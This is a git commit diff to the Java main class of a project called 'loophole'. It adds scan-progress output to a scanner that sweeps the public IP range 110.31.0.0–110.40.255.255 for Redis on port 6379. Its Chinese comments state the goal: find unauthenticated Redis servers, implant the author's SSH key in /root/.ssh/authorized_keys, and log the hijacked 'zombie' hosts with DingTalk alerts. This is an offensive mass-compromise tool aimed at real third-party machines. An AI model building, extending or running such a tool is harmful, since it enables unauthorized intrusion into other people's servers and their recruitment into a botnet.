79e2c83f3c2885e6cbaefaba0bbc8cc5385d87de
杨文 <wen.yang@eku001.com>
2019-05-31 18:43:51 +0800

    新增扫描进度输出

--- src/main/java/com/aoshiguchen/loophole/Main.java
+++ src/main/java/com/aoshiguchen/loophole/Main.java
@@ -10,18 +10,15 @@ import java.net.Socket;
 import java.net.SocketAddress;
 
 /**
- * TODO
+ * 扫描指定范围的公网ip，发现有暴露redis默认端口且未设置认证密码的ip，保存入文件当中，并且发送钉钉通知
+ * 然后自动执行脚本，一键将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里
+ * 保存所有的肉鸡ip，并发送钉钉通知
  * Author: yangwen
  * Date:  2019/5/29
  */
 public class Main {
 
-    private static volatile long count = 0;
-
-    // TODO 扫描指定范围的公网ip，发现有暴露redis默认端口且未设置认证密码的ip，保存入文件当中，并且发送钉钉通知
-    // TODO 然后自动执行脚本，一键将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里
-    // TODO 保存所有的肉鸡ip，并发送钉钉通知
-    public static void main(String[] args) throws Exception {
+    public static void main(String[] args) {
         Foundation.ipv4().ergodicPublicNetworkIp("110.31.0.0","110.40.255.255", // 设置扫描ip段
                 ipv4 ->  check(ipv4.getString(),6379,200), // 过滤暴露6379外网端口的ip
                 (ipv4,progress) -> System.out.println(progress + "%")    // 输出扫描进度
